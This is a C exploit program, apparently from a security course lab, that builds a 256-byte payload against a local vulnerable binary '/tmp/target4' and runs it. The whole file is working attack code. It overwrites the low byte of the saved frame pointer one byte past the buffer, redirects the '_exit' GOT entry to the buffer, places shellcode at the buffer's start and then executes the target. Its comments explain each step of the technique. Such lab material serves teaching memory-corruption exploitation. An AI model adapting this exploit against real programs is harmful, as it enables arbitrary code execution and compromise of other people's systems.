#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_FILE "/tmp/xploit4_output"


// Length of the exploit file
#define XPLOIT_LEN 256

// Address of the buffer we are planning to overflow (found by running modified target multiple times)
#define BUFFER_ADDRESS 0x00007fffffffe740

// Address of the "_exit" function, precisely located at "_exit@got.plt" symbol (in GOT table)
#define EXIT_ADDRESS 0x0000555555558018


int main(int argc, char *argv[]) {
  // Because of "<=" sign on line 11, we can modify only one lowest byte of the stack base address
  char exploit[XPLOIT_LEN + 1];

  // Fill all the buffer with zeroes
  memset(exploit, 0, sizeof(exploit));

  // Change the last byte of the stack base so that it points to the buffer length minus 16 (2 addresses)
  long long int offset = sizeof(void*) * 2;
  exploit[XPLOIT_LEN] = (char) (BUFFER_ADDRESS + XPLOIT_LEN - offset);

  // Put funny number to the stack pointer value - just for fun
  void* payload = (void*) 0xdeadbaba;
  memcpy(&exploit[XPLOIT_LEN - offset], &payload, sizeof(void*));

  // Replace the "p" variable with the "_exit" function address, so that on line 29 it will be overwritten
  void* p_value = (void*) EXIT_ADDRESS;
  memcpy(&exploit[XPLOIT_LEN - offset - sizeof(void*)], &p_value, sizeof(void*));

  // Replace the "a" variable with the start address of the buffer, where shellcode will be located
  void* a_value = (void*) BUFFER_ADDRESS;
  memcpy(&exploit[XPLOIT_LEN - offset - sizeof(void*) * 2], &a_value, sizeof(void*));

  // Put shell code to the very beginning of the buffer
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_FILE);

  char *args[] = { TARGET, DEFAULT_FILE, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");
  fprintf(stderr, "try running \"sudo make install\" in the targets directory\n");

  return 0;
}
